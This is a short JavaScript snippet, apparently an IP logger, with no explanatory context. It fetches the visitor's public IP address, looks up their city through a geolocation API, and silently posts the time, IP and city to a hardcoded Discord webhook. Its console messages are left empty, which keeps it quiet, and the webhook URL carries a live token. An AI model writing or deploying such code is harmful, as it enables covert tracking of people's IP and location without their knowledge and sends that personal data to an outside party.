var date = new Date();
var hora = date.getHours() + ':' + date.getMinutes() + ':' + date.getSeconds();

var ip = '';
var ciudad = '';

fetch('https://api.ipify.org/?format=json')
  .then(function(response) {
    return response.json();
  })
  .then(function(data) {
    ip = data.ip;
    return fetch('http://ip-api.com/json/' + ip);
  })
  .then(function(response) {
    return response.json();
  })
  .then(function(data) {
    ciudad = data.city;
    sendToWebhook(hora, ip, ciudad);
  })
  .catch(function(error) {
    console.error('');
  });

function sendToWebhook(hora, ip, ciudad) {
  var webhookURL = 'https://discord.com/api/webhooks/1128558244999200839/6oxpikUDEyX1SggWnN5N0vmuac2NbDYu97jDBrBGr8JSYIIW9r413t9TxcB4nF-dxRp_';

  var payload = {
    content: 'Hora: ' + hora + '\nIP: ' + ip + '\nCiudad: ' + ciudad
  };

  fetch(webhookURL, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(payload)
  })
  .then(function(response) {
    console.log('');
  })
  .catch(function(error) {
    console.error('');
  });
}
